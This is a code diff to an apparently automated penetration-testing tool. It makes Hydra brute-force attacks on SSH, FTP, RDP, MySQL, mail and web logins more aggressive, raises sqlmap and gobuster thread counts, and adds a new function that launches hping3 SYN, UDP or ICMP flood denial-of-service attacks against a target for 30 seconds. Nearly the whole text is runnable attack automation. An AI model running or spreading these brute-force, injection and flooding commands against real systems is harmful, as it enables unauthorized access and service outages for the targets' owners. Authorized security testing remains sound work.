@@ -155,7 +155,7 @@ def hydra_ssh(opportunity, output_dir):
     info_msg(f"Users: {user_list}, Passwords: {pass_list}")
 
     cmd = (f'hydra -L {user_list} -P {pass_list} '
-           f'-s {port} -t 4 -f -vV '
+           f'-s {port} -t 16 -f -vV '
            f'{ip} ssh')
 
     result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra SSH")
@@ -199,7 +199,7 @@ def hydra_ftp(opportunity, output_dir):
     # Full brute force
     info_msg("Anonymous failed, starting brute force...")
     cmd = (f'hydra -L {user_list} -P {pass_list} '
-           f'-s {port} -t 4 -f -vV '
+           f'-s {port} -t 16 -f -vV '
            f'{ip} ftp')
 
     result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra FTP")
@@ -233,7 +233,7 @@ def hydra_http_form(opportunity, output_dir):
     protocol = 'https-post-form' if parsed.scheme == 'https' else 'http-post-form'
 
     cmd = (f'hydra -L {user_list} -P {pass_list} '
-           f'-s {port} -t 4 -f -vV '
+           f'-s {port} -t 16 -f -vV '
            f'{host} {protocol} "{form_params}"')
 
     result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra HTTP")
@@ -258,7 +258,7 @@ def hydra_smtp(opportunity, output_dir):
     info_msg(f"Launching Hydra SMTP attack on {ip}:{port}")
 
     cmd = (f'hydra -L {user_list} -P {pass_list} '
-           f'-s {port} -t 4 -f -vV '
+           f'-s {port} -t 16 -f -vV '
            f'{ip} smtp')
 
     result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra SMTP")
@@ -283,7 +283,7 @@ def hydra_mysql(opportunity, output_dir):
     info_msg(f"Launching Hydra MySQL attack on {ip}:{port}")
 
     cmd = (f'hydra -L {user_list} -P {pass_list} '
-           f'-s {port} -t 4 -f -vV '
+           f'-s {port} -t 16 -f -vV '
            f'{ip} mysql')
 
     result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra MySQL")
@@ -308,7 +308,7 @@ def hydra_rdp(opportunity, output_dir):
     info_msg(f"Launching Hydra RDP attack on {ip}:{port}")
 
     cmd = (f'hydra -L {user_list} -P {pass_list} '
-           f'-s {port} -t 4 -f -vV '
+           f'-s {port} -t 16 -f -vV '
            f'{ip} rdp')
 
     result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra RDP")
@@ -333,7 +333,7 @@ def hydra_telnet(opportunity, output_dir):
     info_msg(f"Launching Hydra Telnet attack on {ip}:{port}")
 
     cmd = (f'hydra -L {user_list} -P {pass_list} '
-           f'-s {port} -t 4 -f -vV '
+           f'-s {port} -t 16 -f -vV '
            f'{ip} telnet')
 
     result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra Telnet")
@@ -358,7 +358,7 @@ def hydra_pop3(opportunity, output_dir):
     info_msg(f"Launching Hydra POP3 attack on {ip}:{port}")
 
     cmd = (f'hydra -L {user_list} -P {pass_list} '
-           f'-s {port} -t 4 -f -vV '
+           f'-s {port} -t 16 -f -vV '
            f'{ip} pop3')
 
     result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra POP3")
@@ -383,7 +383,7 @@ def hydra_imap(opportunity, output_dir):
     info_msg(f"Launching Hydra IMAP attack on {ip}:{port}")
 
     cmd = (f'hydra -L {user_list} -P {pass_list} '
-           f'-s {port} -t 4 -f -vV '
+           f'-s {port} -t 16 -f -vV '
            f'{ip} imap')
 
     result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra IMAP")
@@ -410,7 +410,7 @@ def sqlmap_url(opportunity, output_dir):
 
     cmd = (f'sqlmap -u "{url}" '
            f'--batch --level=2 --risk=1 '
-           f'--threads=5 '
+           f'--threads=10 '
            f'--output-dir={sqlmap_out} '
            f'--random-agent '
            f'--tamper=between '
@@ -456,7 +456,7 @@ def sqlmap_form(opportunity, output_dir):
            f'--data="{post_data}" '
            f'--method=POST '
            f'--batch --level=2 --risk=1 '
-           f'--threads=5 '
+           f'--threads=10 '
            f'--output-dir={sqlmap_out} '
            f'--random-agent '
            f'2>&1')
@@ -567,7 +567,7 @@ def dirb_scan(opportunity, output_dir):
     if gobuster_check.returncode == 0:
         cmd = (f'gobuster dir -u {url} -w {wordlist} '
                f'-o {output_file} '
-               f'-t 10 --no-error '
+               f'-t 50 --no-error '
                f'-k '  # Skip TLS verification
                f'2>&1')
         label = "Gobuster"
@@ -594,4 +594,50 @@ def dirb_scan(opportunity, output_dir):
     result['success'] = dirs_found > 0
     result['output_file'] = output_file
 
+    return result
+
+
+# ─── DOS STRESS TEST ────────────────────────────────────────
+
+def hping3_dos(opportunity, output_dir):
+    """
+    Perform a Denial of Service (DoS) stress test using hping3.
+    This simulates a flood attack to test system resilience.
+    WARNING: High impact. Use with caution.
+    """
+    ip = opportunity.get('ip', '')
+    port = opportunity.get('port', '80')
+    mode = opportunity.get('mode', 'syn')
+    
+    output_file = os.path.join(output_dir, f'hping3_dos_{ip}_{mode}.txt')
+    
+    info_msg(f"Launching hping3 DoS ({mode.upper()} Flood) on {ip}:{port}")
+    warning_msg("CAUTION: This will flood the target with packets for 30 seconds.")
+    
+    # Modes:
+    # 1. SYN Flood (default): -S -p <port> --flood
+    # 2. UDP Flood: --udp -p <port> --flood
+    # 3. ICMP Flood: --icmp --flood
+    
+    flags = '-S' # SYN default
+    if mode == 'udp':
+        flags = '--udp'
+    elif mode == 'icmp':
+        flags = '--icmp'
+        
+    # Construct command
+    # hping3 requires root privileges usually
+    # We use 'timeout' to stop the flood after 30s
+    
+    cmd = (f'sudo timeout 30s hping3 {flags} '
+           f'-p {port} --flood '
+           f'{ip} '
+           f'2>&1')
+
+    # Expected exit code 124 for timeout command is normal
+    result = run_tool_live(cmd, timeout=40, output_file=output_file, label=f"hping3 {mode.upper()}")
+    
+    result['message'] = "DoS Stress Test Completed (30s duration)"
+    result['success'] = True # Always check logs
+    
     return result
